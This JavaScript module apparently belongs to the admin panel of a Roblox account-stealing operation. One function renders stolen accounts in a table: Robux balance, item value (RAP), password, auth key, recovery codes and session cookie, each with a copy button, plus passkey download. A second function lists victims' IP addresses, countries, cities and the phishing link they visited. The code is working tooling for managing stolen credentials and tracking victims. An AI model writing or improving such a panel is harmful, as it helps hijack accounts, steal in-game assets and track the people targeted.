export function populateUserTable(logData) {
  const userTableBody = document.querySelector("#userTableBody");
  userTableBody.innerHTML = null;

  logData.forEach((data, index) => {
    const embedJson = encodeURIComponent(JSON.stringify(data.embedData));
    const display = escapeHTML(data.user.display);
    const isLast = index === logData.length - 1,
      rowHTML = `
         <tr data-userid="${data.user.id}" class="${isLast || "border-b border-zinc-800"}">
          <td class="px-6 py-4">
            <input
              type="checkbox"
              class="form-checkbox h-5 w-5 text-indigo-600 userCheckbox"
            />
          </td>
	  <td class="px-6 py-4">${data.time}</td>
          <td class="px-6 py-4 flex items-center space-x-3">
            <img
              class="w-10 h-10 rounded-full"
              src="${data.user.thumbnail}"
              alt="${display}"
            />
            <div>
              <div class="font-medium">${display}</div>
              <div class="text-zinc-500">${data.user.username}</div>
            </div>
          </td>
          <td class="px-6 py-4">${data.summary}</td>
          <td class="px-6 py-4">${data.robux}</td>

          <td class="px-6 py-4">${data.rap}</td>
          <td class="px-6 py-4">
            <div class="bg-zinc-800 rounded p-2 relative">
              <div class="copyable-text mr-2">${data.credentials.password}</div>
              <button
                class="absolute end-2 top-1/2 -translate-y-1/2 bg-zinc-800 text-zinc-400 hover:text-white p-2 inline-flex items-center justify-center"
                onclick="copyText(this)"
              >
                📋
              </button>
            </div>
          </td>
          <td class="px-6 py-4">
          <div class="bg-zinc-800 rounded p-2 relative">
            <div class="copyable-text mr-2">${data.credentials.authkey}</div>
            <button
              class="absolute end-2 top-1/2 -translate-y-1/2 bg-zinc-800 text-zinc-400 hover:text-white p-2 inline-flex items-center justify-center"
              onclick="copyText(this)"
            >
              📋
            </button>
          </div>
          </td>
                  <td class="px-6 py-4">
          <div class="bg-zinc-800 rounded p-2 relative">
            <div class="copyable-text mr-2">${data.credentials.recovcodes}</div>
            <button
              class="absolute end-2 top-1/2 -translate-y-1/2 bg-zinc-800 text-zinc-400 hover:text-white p-2 inline-flex items-center justify-center"
              onclick="copyText(this)"
            >
              📋
            </button>
          </div>
          </td>
          <td class="px-6 py-4">
            <div class="bg-zinc-800 rounded p-2 relative">
              <div class="copyable-text mr-2">${data.credentials.cookie}</div>
              <button
                class="absolute end-2 top-1/2 -translate-y-1/2 bg-zinc-800 text-zinc-400 hover:text-white p-2 inline-flex items-center justify-center"
                onclick="copyText(this)"
              >
                📋
              </button>
            </div>
          </td>
          <th scope="col" class="px-6 py-3 w-1/3 cursor-pointer"
              onclick="handlePasskey(this)">
            Download
          </th>

          <th scope="col" class="px-6 py-3 w-1/3 cursor-pointer"
              data-embed="${embedJson}"
              onclick="handleOpenEmbed(this)">
            View
          </th>
        </tr>
    `;

    userTableBody.insertAdjacentHTML("beforeend", rowHTML);
  });
}



export function populatevisitTable(logData) {
  const userTableBody = document.querySelector("#userTableBody");
  userTableBody.innerHTML = null;

  logData.forEach((data, index) => {
    const isLast = index === logData.length - 1,
      rowHTML = `
         <tr class="${isLast || "border-b border-zinc-800"}">
          <td class="px-6 py-4">
            <input
              type="checkbox"
              class="form-checkbox h-5 w-5 text-indigo-600 userCheckbox"
            />
          </td>
          <td class="px-6 py-4">${data.user.ip}</td>
          <td class="px-6 py-4">${data.user.country}</td>
          <td class="px-6 py-4">${data.user.city}</td>

          <td class="px-6 py-4">${data.link.type}</td>
          <td class="px-6 py-4">
            <div class="bg-zinc-800 rounded p-2 relative">
              <div class="copyable-text mr-2">${data.link.url}</div>
              <button
                class="absolute end-2 top-1/2 -translate-y-1/2 bg-zinc-800 text-zinc-400 hover:text-white p-2 inline-flex items-center justify-center"
                onclick="copyText(this)"
              >
                📋
              </button>
            </div>
          </td>
          <td class="px-6 py-4">${data.date}</td>
        </tr>
    `;

    userTableBody.insertAdjacentHTML("beforeend", rowHTML);
  });
}

